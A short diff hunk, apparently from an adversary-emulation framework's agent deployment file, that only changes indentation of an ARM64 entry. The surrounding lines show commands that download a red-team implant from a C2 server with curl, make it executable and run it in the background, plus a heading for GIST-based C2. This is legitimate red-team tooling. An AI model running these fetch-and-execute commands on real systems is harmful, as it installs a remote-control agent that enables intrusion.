@@ -69,12 +69,12 @@
               agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -server $server &
           - description: (ARM64) Compile red-team agent with a comma-separated list of extensions (requires GoLang).
-              architecture: ARM64
-              command: |
-                server="#{app.contact.http}";
-                curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
-                chmod +x #{agents.implant_name};
-                ./#{agents.implant_name} -server $server -v
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
           - description: (ARM64) Download with GIST C2
             architecture: ARM64
             command: |
